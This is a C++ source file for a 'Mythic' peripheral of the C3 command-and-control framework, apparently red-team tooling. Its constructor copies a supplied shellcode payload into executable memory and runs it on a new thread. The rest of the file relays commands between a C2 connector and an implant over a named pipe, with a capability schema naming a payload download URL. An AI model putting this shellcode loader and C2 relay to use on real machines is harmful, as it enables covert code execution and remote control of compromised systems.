#include "StdAfx.h"
#include "Mythic.h"


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Peripherals::Mythic::Mythic(ByteView arguments)
	: m_NextMessageTime{ std::chrono::high_resolution_clock::now() }
{
	auto [pipeName, connectAttempts, automaticExecution, payload] = arguments.Read<std::string, uint32_t, std::string, ByteVector>();

	BYTE* x = (BYTE*)payload.data();
	SIZE_T len = payload.size();

	namespace SEH = FSecure::WinTools::StructuredExceptionHandling;

	if (automaticExecution != "false")
	{
		// TODO: Complete implementation
		/*Log({ OBF_SEC("Automatic execution, executing payload"), LogMessage::Severity::DebugInformation });
		if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(SEH::SehWrapperCov), &args, 0, nullptr))
		{
			throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
		}*/
		// Shellcode
		PVOID pa = VirtualAlloc(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (nullptr == pa) {
			throw std::runtime_error{ OBF("Couldn't allocate mem: ") + std::to_string(GetLastError()) + OBF(".") };
		}
		memcpy(pa, payload.data(), payload.size());
		DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
		if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(sehWrapper), pa, 0, nullptr))
			throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
	}

	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give Agent thread time to start pipe.
	for (auto i = 0u; i < connectAttempts; i++)
	{
		try
		{
			m_Pipe = WinTools::AsyncPipe{ ByteView{ pipeName } };
			m_Pipe->AsyncRead();
			//m_Pipe = WinTools::AlternatingPipe{ ByteView{ pipeName + "w" } };
			//m_Pipew = WinTools::AlternatingPipe{ ByteView{ pipeName } };
			return;
		}
		catch (std::exception& e)
		{
			// Sleep between trials.
			Log({ OBF_SEC("Grunt constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
			std::this_thread::sleep_for(std::chrono::milliseconds{ 100 });
		}
	}
	throw std::runtime_error{ OBF("Agent creation failed") };
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Peripherals::Mythic::OnCommandFromConnector(ByteView packet)
{
	// Construct a copy of received packet trimmed to 10 characters and add log it.
	Log({ OBF("Mythic received: ") + std::string{ packet.begin(), packet.size() < 10 ? packet.end() : packet.begin() + 10 } + OBF("..."), LogMessage::Severity::DebugInformation });

	Log({ OBF("Mythic received: ") + std::string{ packet.begin(), packet.end()} + OBF("..."), LogMessage::Severity::DebugInformation });

	m_Pipe->AsyncWrite(packet);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Mythic::OnReceiveFromPeripheral()
{
	/*std::unique_lock<std::mutex> lock(*m_Pipe->eventMutex);
	m_Pipe->senderEvent->wait(lock);*/
	//auto data = this->m_Pipe->_senderQueue.front();
	// 
	// 
	//m_Pipe->AsyncRead();
	/*if (m_Pipe->ready)
	{
		m_Pipe->ready = false;
		std::string_view strView(m_Pipe->lastMsg.data(), m_Pipe->lastMsg.size());

		return ByteView(strView);
	}*/
	
	if (m_Pipe->messageQueue.size() > 0) {
		std::string message = m_Pipe->messageQueue.front();
		m_Pipe->messageQueue.pop();
		std::string_view strView(message.data(), message.size());
		return ByteView(strView);
	}
	m_NextMessageTime = std::chrono::high_resolution_clock::now() + 5s;
	return {};
	// Send heart beat every 5s.
	//if (m_NextMessageTime > std::chrono::high_resolution_clock::now())
	//	return {};

	//m_NextMessageTime = std::chrono::high_resolution_clock::now() + 5s;

	////return  ByteView{ OBF("Beep") };
}

FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Mythic::OnRunCommand(ByteView command)
{
	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		return TestErrorCommand(command);
	default:
		return AbstractPeripheral::OnRunCommand(commandCopy);
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Mythic::TestErrorCommand(ByteView arg)
{
	//GetBridge()->SetErrorStatus(arg.Read<std::string>());
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteView FSecure::C3::Interfaces::Peripherals::Mythic::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":[
			{
				"type": "select",
				"name": "Automatic Execution",
				"selected": "false",
				"defaultValue" : "false",
				"options" : {"true": "true", "false": "false"},
				"feedback" : "validated",
				"description": "Execute grunt manually or automatically."
			},
			{
				"type": "string",
				"name": "Pipe name",
				"min": 4,
				"randomize": true,
				"description": "Name of the pipe Beacon uses for communication."
			},
			{
				"type": "int32",
				"min": 10,
				"defaultValue" : 30,
				"name": "Connect Attempts",
				"description": "Number of attempts to connect to SMB Pipe"
			},
			{
				"type": "string",
				"min": 4,
				"name": "Payload URL",
				"description": "Generated payload download URL from Mythic"
			}
		]
	},
	"commands":
	[
		{
			"name": "Test command",
			"description": "Set error on connector.",
			"id": 0,
			"arguments":
			[
				{
					"name": "Error message",
					"description": "Error set on connector. Send empty to clean up error"
				}
			]
		}
	]
}
)";
}
